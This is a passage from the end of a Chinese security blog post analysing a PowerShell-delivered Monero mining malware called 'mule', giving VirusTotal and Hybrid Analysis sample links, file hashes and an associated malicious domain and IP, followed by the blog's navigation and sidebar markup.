+<p>其中<strong>mule</strong>样本和windows下的<strong>mule64.exe</strong>样本在virustotal上分析结果是门罗币挖矿程序</p>
+<p><a href="https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details" target="_blank" rel="external">https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details</a></p>
+<p><a href="https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details" target="_blank" rel="external">https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details</a></p>
+<p><a href="https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f</a>  (hybrid-analysis的分析)</p>
+<p><strong>ait7ee.win</strong> 这个域名和下面命令中的<strong>149.255.35.91</strong>是同一个ip，virustotal上在10月18号有记录这个域名和相关文件，样本还没有上传</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-1-29.png" alt="15-1-29"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/01/10/powershell植入mule挖矿程序事件分析/" data-id="cjca1zrwj000g881bgu68fot0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          利用java反序列化漏洞植入门罗币挖矿程序事件分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">利用s2-045植入门罗币挖矿程序事件分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <!--
+<footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 SY0U<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+-->
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
